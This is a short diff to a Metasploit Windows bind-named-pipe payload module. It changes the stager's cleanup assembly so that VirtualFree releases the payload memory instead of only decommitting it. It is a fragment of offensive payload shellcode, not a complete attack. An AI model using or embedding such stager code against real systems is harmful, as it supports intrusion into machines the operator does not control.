@@ -286,11 +286,11 @@ module Payload::Windows::BindNamedPipe
 
       ; something failed so free up memory
         pop ecx
-        push 0x4000             ; MEM_DECOMMIT
+        push 0x8000             ; MEM_RELEASE
         push 0                  ; dwSize, 0 to decommit whole block
         push ecx                ; lpAddress
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
-        call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
+        call ebp                ; VirtualFree(payload, 0, MEM_RELEASE)
 
       cleanup_file:
       ; cleanup the pipe handle
